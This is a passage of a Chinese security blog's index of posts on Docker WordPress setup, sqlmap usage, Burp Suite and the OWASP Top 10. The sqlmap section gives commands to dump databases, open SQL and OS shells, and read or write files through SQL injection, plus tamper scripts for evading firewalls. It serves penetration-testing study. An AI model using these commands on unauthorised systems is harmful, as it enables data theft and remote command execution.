&quot;hello world&quot;; ?&gt; 验证：在浏览器中输入服务器ip:index.php，出现hello world页面，说明配置成功。]]></content>
      <categories>
        <category>搭建服务</category>
      </categories>
      <tags>
        <tag>LNMP</tag>
        <tag>ngixn</tag>
        <tag>mysql</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Docker一分钟搭建WordPress博客]]></title>
    <url>%2F2018%2F08%2F15%2F%E7%94%A8Docker%E4%B8%80%E5%88%86%E9%92%9F%E6%90%AD%E5%BB%BAWordPress%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[0x01 【前言】WordPress是一个非常著名的PHP编写的博客平台，发展到目前为止已经形成了一个庞大的网站平台系统。在WP上有规模庞大的插件和主题，可以帮助我们快速建立一个博客甚至网站。 在Windows上可以非常方便的安装WordPress，因为IIS上集成了WordPress的一键安装包。而在Linux上安装WordPress就比较复杂了，我们需要配置PHP环境、Apache或者Nginx服务器、MySQL数据库以及各种权限和访问问题。所以在Linux上最好的办法就是使用Docker来安装WordPress。 0x02 【安装环境】CentOS Linux release 7.5.1804(Core) 0x03 【安装步骤】一、安装Docker12345yum update -yyum -y install dockersystemctl start docker 验证安装 docker version 配置Docker 设置镜像1234567vim /etc/docker/daemon.json&#123; &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]&#125; 重启Docker123systemctl daemon-reloadsystemctl restart docker.service 二、安装WordPress有了Docker，安装WordPress就很简单了，直接一条命令搞定。1docker pull wordpress:latest 三、安装MySQLWordPress需要使用MySQL数据库，这里也有两种方式，第一种是安装本地MySQL，第二种就是在Docker中安装MySQL镜像。如果要在Docker中安装MySQL也非常简单，同样一条命令搞定。1docker pull mysql:latest 启动MySQL使用下面的命令。1docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag name参数指定要启动的实例名称，MYSQL_ROOT_PASSWORD指定ROOT密码。tag参数是MySQL的版本号，可以是5.7、5.6、8.0 四、配置WordPress安装好数据库之后，就可以启动WordPress了。详细的文档参考这里。如果使用Docker中安装的MySQL实例，使用下面的命令。1docker run --name some-wordpress --link some-mysql:mysql -p 8080:80 -d wordpress name参数指定要启动的WordPress实例名称，link参数指定要使用的Docker MySQL实例名称，p参数将Docker内部的80端口映射到本地的8080端口上。 五、检测然后打开浏览器，输入localhost:8080（端口号是命令中设置的），然后就可以看到WordPress了。按照提示输入用户名等信息，然后安装WordPress。等到它提示安装完成，那么WordPress的安装就算大功告成了。 最后稍加配置，再添加诸如内网映射等功能之后，站点就可以对外访问了。 0x04 参考文献：https://blog.csdn.net/u011054333/article/details/70136099]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客，mysql，wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap基本使用]]></title>
    <url>%2F2018%2F08%2F15%2Fsqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统 完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。 在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。 支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。 Liunx上安装sqlmap Windwos上安装sqlmap安装python环境，并设置环境变量 将SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 “C:\Python27” 目录下 SQLmap检测sql注入 使用python sqlmap.py -u ‘http://xxx/xx?id=1&#39; sqlmap -u “注入点地址” –cookie= -D 数据库 -T usr –column SQLmap通过注入获取当前数据库 使用python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –current-db SQLmap通过注入获取数据库下的表 使用python sqlmap.py -ua ‘http://xxx/xx?id=1&#39; –tables -D database SQLmap通过注入获取表内数据 使用python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –dump -T tables -D database SQLmap通过注入执行sql语句 使用 python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –sql-shell SQLmap通过注入执行系统命令 使用 python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –os-shell 若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。 当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。 获取目标方式1.直接连接到数据库 参数：-d 对单个数据库实例运行sqlmap python sqlmap.py -d “mysql://admin:admin@192.168.1.2:3306/testdb” -f –banner –dbs –users 2.目标URL 参数：-u或者—url URL格式要求：http(s)://targeturl[:port]/[…] python sqlmap.py -u “http://www.target.com/vuln.php?id=1&quot; -f –banner –dbs –users 3.从Burp或WebScarab代理中获取日志 参数：-l 把Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap检测 4.从文本中获取多个目标扫描 参数：-m URL保存在文本中，sqlmap会一个一个检测 5.从文件中加载HTTP请求 参数：-r 【可以跳过设置一些其他参数比如cookie，POST数据】 当请求是HTTPS的时候要配合—force-ssl参数来使用，或者你可以在Host头后面加上:443 请求方式：1.http数据 参数：--data 此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数 python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users 2.参数拆分字符 参数：--param-del 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数 python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users 3.HTTP cookie头 参数：--cookie/--load-cookies/--drop-set-cookie a.web应用需要登陆的时候 b.你想要在这些头参数中测试SQL注入时 如果你不想接受set-cookie可以使用—drop-set-cookie参数来拒接 4.HTTP User-Agent头 参数：--user-agent/--random-agent 【可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取】 当--level参数设定为3或者3以上的时候，会尝试对User-agent进行注入 探测：1.URI注入点 参数：-u python sqlmap.py -u &quot;http://www.target.com/vuln/param1/vuln1*/param2&quot; 2.指定数据库 参数：--dbms sqlmap会自动探测web的应用后端数据库是什么 3.风险等级 参数：--risk 共有四个风险等级，默认是1，会探测大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 4.列出数据库系统的数据库 参数：–dbs 当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库 5.列举数据库表 参数：–tables,–exclude-sysdbs,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。 --exclude-sysdbs参数是指排除包含了所有数据库名的系统数据库。 需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。 6.列举数据库表中的字段 参数：–columns,-C,-T,-D 当前用户有权限读取包含所有数据库表信息的表中数据的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。 如果没有使用-D参数指定数据库时，默认会使用当前数据库。 7.获取整个表的数据 参数：–dump,-C,-T,-D,–start,–stop,–first,–last 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。 使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。 可以获取指定库中的所有表的内容，使用--dump跟-D参数（不使用-T与-C参数）。 爆破：1.暴力破解表名 参数：–common-tables 当使用–tables无法获取到数据库的表时，可以使用此参数。通常是如下情况： 1、MySQL数据库版本小于5.0，没有information_schema表。 2、数据库是MicrossoftAccess，系统表MSysObjects是不可读的（默认）。 3、当前用户没有权限读取系统中保存数据结构的表的权限。 **暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。** 2.暴力破解列名 参数：–common-columns 与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。 补充：列取数据库 sqlmap.py -u [URL] –dbs 获取当前数据库 sqlmap.py -u [URL] –current-db 判断当前数据库用户角色 sqlmap.py -u [URL] –privileges 判断当前数据库用户是否为数据库管理员 sqlmap.py -u [URL] –-is-dba 列表名 sqlmap.py -u [URL] –dbms “mysql” –tables -D “db_name” 列字段 sqlmap.py -u [URL] –dbms “mysql” –columns -D “db_name” -T “ex_admin“ 获取字段内容 sqlmap.py -u [URL] –dbms “mysql” –dump -D “db_name” -T “ex_admin” -C “ex_password,ex_username 如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数 据的，可以使用-v参数。 共有七个等级，默认为1： 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。 如果你想看到sqlmap发送的测试payload最好的等级就是3 sqlmap常用命令-u 指定url（需带get） -m 从文件读取 -r 从request文件测试 -l 从burp的log –data 有时无法识别时 用-r –file-read –file-write –os-cmd/–os-shell –flush-session ➢api 自动化、分布式 sqlmapapi.py -s H 127.0.0.1 -p 6666 Tamper 概览 脚本名称 作用 apostrophemask.py 用utf8代替引号 equaltolike.py like 代替等号 space2dash.py 绕过过滤‘=’ 替换空格字符（”），（’’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’） greatest.py 绕过过滤’&gt;’ ,用GREATEST替换大于号。 space2hash.py 空格替换为#号 随机字符串 以及换行符 apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符 appendnullbyte.py 在有效负荷结束位置加载零字节字符编码 ifnull2ifisnull.py 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py 空格替换为其它空符号 base64encode.py 用base64编码替换 space2mssqlhash.py 替换空格 modsecurityversioned.py 过滤空格，包含完整的查询版本注释 space2mysqlblank.py 空格替换其它空白符号(mysql) between.py 用between替换大于号（&gt;） space2mysqldash.py 替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） multiplespaces.py 围绕SQL关键字添加多个空格 space2plus.py 用+替换空格 bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like nonrecursivereplacement.py 取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集 sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 chardoubleencode.py 双url编码(不处理以编码的) unionalltounion.py 替换UNION ALL SELECT UNION SELECT charencode.py url编码 randomcase.py 随机大小写 unmagicquotes.py 宽字符绕过 GPC addslashes randomcomments.py 用/**/分割sql关键字 charunicodeencode.py 字符串 unicode 编码 securesphere.py 追加特制的字符串 versionedmorekeywords.py 注释绕过 space2comment.py Replaces space character (‘ ‘) with comments ‘/**/’ SQL常用语句SQL常用语句 内容 MSSQL MYSQL ORACLE 查看版本 select @@version select @@version select version() Select banner from v$version; 当前用户 select system_users; select suer_sname(); select user; select loginname from master..sysprocesses WHERE spid =@@SPID; select user(); select system_user(); Select user from dual 列出用户 select name from master..syslogins; select user from mysql.user; Select username from all_users ORDER BY username; Select username from all_users; 当前库 select DB_NAME(); select database(); Select global_name from global_name; 列出数据库 select name from master..sysdatabases; select schema_name from information_schema.schemata; Select ower,table_name from all_users; #列出表明 当前用户权限 select is_srvolemenber(‘sysadmin’); select grantee, privilege_type,is_grantable from information schema.user privileges; Select from user role_privs; Select from user_sys_privs; 服务器主机名 select @@servername; / Select sys_context(‘USERENV’,’HOST’) from dual;]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>工具使用，slqmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burp Suite基本认识]]></title>
    <url>%2F2018%2F08%2F15%2FBurp-Suite%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。它主要用来做安全性渗透测试,代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动。 Target功能目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以 让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏 洞的过程。 site map——add to scope——点击Filter勾选Show only inscope item proxy（抓包）当我们设置好代理后，浏览器和服务器之间的数据包会被burp拦截，我们可以修改浏览器限制数据，修改完成直接forward就可以。 spider（爬虫）可以利用爬虫从页面源代码中提取子域名，以 burp 的爬虫为例： scanner（扫描）Burp Scanner的功能主要是用来自动检测web系统的各种漏洞，我们可以使用Burp Scanner代替我们手工去对系统进行普通漏洞类型的渗透测试，从而能使得我们把更多的精力放在那些必须要人工去验证的漏洞上。 Intruder（爆破）Burp intruder是一个强大的工具，用于自动对Web应用程序自定 义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可 能出现的u支持自动识别密码哈希格式并通过字典破解密码哈希。 支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。 支持在数据库管理系统中搜索指定的数据库名、表名或列名 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。 ​ 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出 第一种： Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种： Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种： Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种： Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 Repeater功能Burp Repeater(中继器)是用于手动操作和补发个别HTTP请求，并 分析应用程序的响应一个简单的工具。您可以发送一个内部请求从 Burp任何地方到Repeater(中继器)，修改请求并且发送它。 ➢您可以使用中继器用于各种目的，如改变参数值来测试输入为基础 的漏洞，发出以特定的顺序要求，以测试逻辑缺陷，并可以多次重 发从Burp Scanning results(扫描结果)的要求手动验证报告的问题。]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OWASP TOP 10]]></title>
    <url>%2F2018%2F08%2F14%2FOWASP-TOP-10%2F</url>
    <content type="text"><![CDATA[开源Web应用安全项目（OWASP ）是一个开放的社区，致力于帮助各企业组织开发、购买和维护可信任的应用程序。 A1:注入将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。 影响： 注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机完全接管。 应用程序脆弱： 用户提供的数据没有经过应用程序的验证、过滤或净化 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。 在ORM搜索参数中使用了恶意数据，这样搜索就得包含敏感或未授权的数据。 恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语句、命令或存储过程中包含结构和恶意数据。 如何防止： 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。 使用正确的或“白名单”的具有恰当规范化的验证方法同样会有助于防止注入攻击，但这个不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符，OWASP的Java Encoder和雷士的库提供了这样的转义例程。 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。 A2：失效的身份认证通常。通过错误使用程序的身份认证和会话管理功能，红记者能后破译密码，密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久冒充其他用户的身份。 影响： 攻击者只需要访问几个账户，或者只需要一个管理员账户就可以破坏我们的系统，根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。 脆弱性： 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。 允许暴力破解或其他自动攻击。 允许默认的、弱的或众所周知的密码，例如“Password1”或 “admin/admin”。 使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的 答案”，这是不安全的。 使用明文、加密或弱散列密。 缺少或失效的多因素身份验证。 暴露URL中的会话ID（例如URL重写）。 在成功登录后不会更新会话ID。 不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证 令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。 防范： 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、 暴力破解和被盗凭据再利用攻击。 不要使用发送或部署默认的凭证，特别是管理员用户。 执行弱密码检查，例如测试新或变更的密码。 将密码长度、复杂性和循环策略，或其他现代的基于证据的密码策略相一致。 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同 的消息，用以抵御账户枚举攻击。 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填 充、暴力破解或其他攻击被检测时提醒管理员。 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的 新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、 闲置、绝对超时后使其失效 A3:敏感数据泄露许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可 以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。 脆弱性： 在数据传输过程中是否使用明文传输？这和传输协议相关，如： HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通 信，如：负载平衡器、Web服务器或后端系统之间的通信。 当数据被长期存储时，无论存储在哪里，它们是否都被加密，包 含备份数据？ 无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加 密算法？ 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者 缺少恰当的密钥管理或密钥回转？ 是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和 传输协议是否被加密？ 用户代理（如：应用程序、邮件客户端）是否未验证服务器端证 书的有效性 防范： 对系统处理、存储或传输的数据分类，并根据分类进行访问控制。 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保 护敏感数据。 对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过 PCI DSS标记或拦截。未存储的数据不能被窃取。 确保存储的所有敏感数据被加密。 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 确保传输过程中的数据被加密，如：使用TLS。确保数据加密被 强制执行，如：使用HTTP严格安全传输协议（HSTS ）。 禁止缓存对包含敏感数据的响应。 确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、 bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受 范围。 单独验证每个安全配置项的有效性。 A4：XML外部实体（XXE）许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃 取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻 击。 如果攻击者可以上传XML文档或者在 XML文档中添加恶意内容，通过易受 攻击的代码、依赖项或集成，他们就 能够攻击含有缺陷的XML处理器。 影响： XXE缺陷可用于提取数据、执行远程 服务器请求、扫描内部系统、执行拒 绝服务攻击和其他攻击。 业务影响取决于所有受影响的应用程 序和数据保护需求。 脆弱性： 您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件， 并提交给XML处理器解析。 在应用程序或基于Web服务的SOAP中，所有XML处理器都启用 了文档类型定（DTDs）。因为禁用DTD进程的确切机制因处 理器而不同，更多资料请参考：《OWASP Cheat Sheet ‘XXE Prevention‘ 》。 如果为了实现安全性或单点登录（SSO），您的应用程序使用 SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。 如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传 递到SOAP框架，那么它可能受到XXE攻击。 存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括： Billion Laughs 攻击。 防范： 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进 行序列化。 及时修复或更新应用程序或底层操作系统使用的所有XML处理器 和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高 版本。 参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》，在应用程序 的所有XML解析器中禁用XML外部实体和DTD进程。 在服务器端实施积极的（“白名单”）输入验证、过滤和清理， 以防止在XML文档、标题或节点中出现恶意数据。 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证 方法来验证上传的XML文件。 尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的 最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。 A5:失效的访问控制未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数 据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。 影响： 攻击者可以冒充用户、管 理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。 业务影响取决于应用程序和数据的保护需求。 脆弱性： 通过修改 URL、内部应用程序状态或 HTML页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。 允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。 特权提升。在不登录的情况下假扮用户，或以用户身份登录时充 当管理员。 元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权 限的cookie 或隐藏字段。 CORS配置错误允许未授权的API访问。 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看 到的页面、或作为标准用户访问具有相关权限的页面、或API没 有对POST、PUT和DELETE强制执行访问控制。 防范： 除公有资源外，默认情况下拒绝访问。 使用一次性的访问控制机制，并在整个应用程序中不断重用它们， 包括最小化CORS使用。 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、 读取、更新或删除的任何记录。 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域 模型强制执行。 禁用 Web服务器目录列表，并确保文件元数据（如：git）不存 在于 Web的根目录中。 记录失败的访问控制，并在适当时向管理员告警（如：重复故 障）。 对API和控制器的访问进行速率限制，以最大限度地降低自动化 攻击工具的危害。 当用户注销后，服务器上的JWT令牌应失效。 A6：安全配置错误安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云 存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所 有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。 通常，攻击者能够通过未修复的漏洞、 访问默认账户、不再使用的页面、未 受保护的文件和目录等来取得对系统 的未授权的访问或了解。 影响： 这些漏洞使攻击者能经常访问一些未 授权的系统数据或功能。有时，这些 漏洞导致系统的完全攻破。 业务影响取决于您的应用程序和数据 的保护需求 脆弱性： 应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的 权限配置错误。 应用程序启用或安装了不必要的功能（例如：不必要的端口、服 务、网页、帐户或权限）。 默认帐户的密码仍然可用且没有更改。 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。 对于更新的系统，禁用或不安全地配置最新的安全功能。 应用程序服务器、应用程序框架（如：Struts、Spring、 ASP.NET）、库文件、数据库等没有进行安全配置。 服务器不发送安全标头或指令，或者未对服务器进行安全配置。 您的应用软件已过期或易受攻击 防范： 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。 开发、质量保证和生产环境都应该进行相同配置，并且，在每个 环境中使用不同的密码。这个过程应该是自动化的，以尽量减少 安装一个新安全环境的耗费 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档 和示例。移除或不安装不适用的功能和框架。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并 将其作为更新管理过程的一部分。在检查过程中，应特别注意云存储权限（如： S3桶权限）。 一个能在组件和用户间提供有效的分离和安全性的分段应用程 序架构，包括：分段、容器化和云安全组。 • 向客户端发送安全指令，如：安全标头。 在所有环境中能够进行正确安全配置和设置的自动化过程。 A7：跨站脚本（XSS）当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或 JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器 中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。 影响： XSS对于反射和DOM的影响是中 等的，而对于存储的XSS，XSS的 影响更为严重，譬如在受攻击者的 浏览器上执行远程代码，例如：窃 取凭证和会话或传递恶意软件等 脆弱性： 存在三种XSS类型，通常针对用户的浏览器： 反射式XSS：应用程序或API包括未经验证和未经转义的用户输入， 作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者 的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指 向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站， 广告或类似内容。 存储式XSS：你的应用或者API将未净化的用户输入存储下来了， 并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一 般被认为是高危或严重的风险。 基于DOM的XSS：会动态的将攻击者可控的内容加入页面的 JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的 来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript API。 典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、 对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其 他用户侧的攻击。 防范： 使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0 或 React JS。了解每个框架的XSS保护的局限性，并适当地处 理未覆盖的用例。 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML 输出的上下文（包括：主体、属性、JavaScript、CSS或URL） 对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据 转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》 。 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》 描述的类似上下文敏感的转义技术应用于浏览器API。 使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果 不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径 遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有 效的。 A8:不安全的反序列化不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以 利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。 对反序列化的利用是有点困难的。因 为在不更改或调整底层可被利用代码 的情况下，现成的反序列化漏洞很难 被使用 影响： 反序列化缺陷的影响不能被低估。它 们可能导致远程代码执行攻击，这是 可能发生的最严重的攻击之一。业务影响取决于应用程序和数据的保 护需求。 脆弱性： 这可能导致两种主要类型的攻击： 如果应用中存在可以在反序列化过程中或者之后被改变行为的类， 则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我 们将其称为对象和数据结构攻击。 典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有 的数据结构，但内容发生了变化。 在应用程序中，序列化可能被用于: 远程和进程间通信（RPC / IPC） 连线协议、Web服务、消息代理 缓存/持久性 数据库、缓存服务器、文件系统 HTTP cookie、HTML表单参数、API身份验证令牌 防范： 执行完整性检查，如：任何序列化对象的数字签名，以防止恶 意对象创建或数据篡改。 在创建对象之前强制执行严格的类型约束，因为代码通常被期 望成一组可定义的类。绕过这种技术的方法已经被证明，所以 完全依赖于它是不可取的。 如果可能，隔离运行那些在低特权环境中反序列化的代码。 记录反序列化的例外情况和失败信息，如：传入的类型不是预 期的类型，或者反序列处理引发的例外情况。 限制或监视来自于容器或服务器传入和传出的反序列化网络连 接。 监控反序列化，当用户持续进行反序列化时，对用户进行警告。 A9：使用含有已知漏洞的组件组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏 洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组 件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。 影响： 虽然对于一些已知的漏洞其影响很小， 但目前很多严重的安全事件都是利用 组件中的已知漏洞。根据你所要保护 的资产，此类风险等级可能会很高。 脆弱性： 如果你不知道所有使用的组件版本信息（包括：服务端和客户 端）。这包括了直接使用的组件或其依赖的组件。 如果软件易受攻击，不再支持或者过时。这包括：OS、Web服 务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、 API和所有的组件、运行环境和库。 